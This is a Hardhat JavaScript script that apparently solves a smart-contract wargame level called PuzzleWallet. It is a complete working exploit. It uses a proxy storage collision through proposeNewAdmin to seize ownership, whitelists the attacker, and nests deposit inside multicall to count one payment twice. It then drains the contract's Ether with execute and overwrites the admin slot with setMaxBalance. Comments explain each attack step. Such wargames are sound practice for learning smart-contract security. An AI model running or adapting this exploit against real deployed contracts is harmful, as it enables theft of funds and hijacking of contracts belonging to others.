const hre = require("hardhat");
const delegateABI = require("../artifacts/contracts/Challenge 24/PuzzleWallet.sol/PuzzleProxy.json"); // get ABI from Proxy contract
const delegateABI2 = require("../artifacts/contracts/Challenge 24/PuzzleWallet.sol/PuzzleWallet.json"); // get ABI from logic contract

async function main() {
  // First get victim contract
  const Victim = await ethers.getContractFactory("PuzzleWallet");
  const victim = await Victim.attach(
    "0xEc48279b03c6c8499bd7566b7973Dc528fC755e2" // This is the contract address that you get from starting your instance
  );

  // We can check who the owner initially is
  const owner1 = await victim.owner();
  console.log("The owner initially is ", owner1);

  const wallet = process.env.PUBLIC_KEY;

  // Now we will call the proposeNewAdmin function to become the owners
  // We have to do via encodeFunctionData because we are interacting with the logic contract
  const delgateInterface = new ethers.utils.Interface(delegateABI.abi);
  const data = delgateInterface.encodeFunctionData(`proposeNewAdmin`, [wallet]);
  const [owner, addr1] = await ethers.getSigners(); // get your account
  const attack1 = await owner.sendTransaction({
    to: victim.address, // no need to send eth
    data: data, // we pass in the data variable obtained above
    gasLimit: 100000, // to not get error gas
  });

  await attack1.wait(1);

  // We can verify we are the owners
  const owner2 = await victim.owner();
  console.log("The owner now is ", owner2);

  // Since we are the owners, we pass require statement to add us to the White list
  const attack2 = await victim.addToWhitelist(wallet);
  await attack2.wait(1);

  // Verify that we've been added
  const value1 = await victim.whitelisted(wallet);
  console.log("The value now is ", value1);

  // We get the balance of the contract to know how much to drain
  const provider = hre.ethers.provider;
  const initialbalance = await provider.getBalance(victim.address); // we see that the contract has 0.001 Ether
  console.log("The balance of the contract is ", initialbalance.toString());

  // We need to create data that encompasses the deposit function inside a multicall function, this is to pass the deposit
  // selector statement
  const delgateInterface2 = new ethers.utils.Interface(delegateABI2.abi);
  const data2 = delgateInterface2.encodeFunctionData(`deposit`, []);
  const data3 = delgateInterface2.encodeFunctionData(`multicall(bytes[])`, [
    [data2], // pass inside multicall the deposit function
  ]);

  // the second only updates the balance
  const attack3 = await victim.multicall([data2, data3], {
    value: 1000000000000000, // 0.001 Ether
  });
  await attack3.wait(1);

  // Check balance of the contract
  const finalbalance = await provider.getBalance(victim.address);
  console.log("The balance of the contract is ", finalbalance.toString());

  // Check your balance and verify it equals the total balance
  const balance1 = await victim.balances(wallet);
  console.log("Your balance is ", balance1.toString());

  // Now call execute to drain contract
  const attack4 = await victim.execute(wallet, 2000000000000000, "0x");
  await attack4.wait(1);

  // Verify that the balance is 0
  const finalbalance1 = await provider.getBalance(victim.address);
  console.log("The balance of the contract is ", finalbalance1.toString());

  // Finally after we have passed the two conditions of the required statement, call setMaxBalance function
  const attack5 = await victim.setMaxBalance(wallet);
  await attack5.wait(1);

  // Verify that the position has your address
  const value2 = await victim.maxBalance();
  console.log("The second position has ", value2.toString()); // it should be converted to number
}

// Recommended pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
